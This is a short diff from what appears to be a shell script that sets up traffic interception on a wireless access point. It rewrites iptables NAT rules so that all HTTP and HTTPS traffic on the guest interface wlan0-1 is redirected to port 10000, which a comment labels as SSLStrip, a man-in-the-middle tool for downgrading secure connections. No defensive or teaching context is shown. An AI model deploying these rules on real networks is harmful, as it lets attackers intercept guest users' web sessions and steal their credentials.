@@ -21,5 +21,5 @@
 
 # Send all trafic on the guest interface to SSLStrip
 
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
-iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000
+iptables -i wlan0-1 -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+iptables -i wlan0-1 -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000
